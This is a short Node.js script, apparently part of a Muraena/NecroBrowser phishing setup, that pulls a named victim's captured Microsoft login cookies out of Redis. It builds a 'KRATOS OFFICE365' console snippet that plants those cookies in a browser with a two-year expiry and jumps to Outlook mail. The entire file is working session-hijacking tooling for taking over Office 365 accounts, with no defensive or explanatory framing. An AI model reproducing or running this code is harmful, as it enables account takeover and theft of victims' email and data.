// Generate the cookie injection script from Redis and write to stdout
// Run from /app inside muraena-necrobrowser-1
const { createClient } = require('redis')
const fs = require('fs')

const uuid = "B64A0a6a-0fB1-47eC-a2DA-2f4901dF1a3d"
const rc = createClient({ url: process.env.REDIS_URL || (process.env.REDIS_PASSWORD ? 'redis://:' +( encodeURIComponent(process.env.REDIS_PASSWORD) ) + '@redis:6379' : 'redis://redis:6379') })

rc.connect().then(async () => {
    const cookieNames = await rc.lRange(`victim:${uuid}:cookiejar_entries`, 0, -1)
    const cookies = []
    for (const name of cookieNames) {
        const h = await rc.hGetAll(`victim:${uuid}:cookiejar:${name}`)
        if (h && h.value) {
            cookies.push({
                Name: h.name || name,
                Value: h.value,
                Domain: h.domain || '.login.microsoftonline.com',
                Path: h.path || '/',
                Secure: (h.secure === '1'),
                HttpOnly: (h.httpOnly === '1'),
                SameSite: h.sameSite || 'None',
                Expires: parseInt(h.expires) || 0
            })
        }
    }
    await rc.quit()

    const b64 = Buffer.from(JSON.stringify(cookies)).toString('base64')
    const script = [
        '// KRATOS OFFICE365 — paste in DevTools console on https://login.microsoftonline.com',
        '(function(){',
        '  var c=JSON.parse(atob("' + b64 + '"));',
        '  var exp=new Date(Date.now()+63072000000).toUTCString();',
        '  c.forEach(function(k){',
        '    var s=k.Name+"="+k.Value+";domain="+k.Domain+";path="+k.Path+";expires="+exp+";SameSite=None";',
        '    if(k.Secure)s+=";Secure";',
        '    try{document.cookie=s}catch(e){}',
        '  });',
        '  setTimeout(function(){window.location.href="https://outlook.office.com/mail/"},500);',
        '})();'
    ].join('\n')

    fs.writeFileSync('/tmp/cookie_script.txt', script)
    console.log('Cookies: ' + cookies.length)
    console.log('Script length: ' + script.length)
    console.log('Script written to /tmp/cookie_script.txt')
}).catch(e => { console.error(e.message); process.exit(1) })
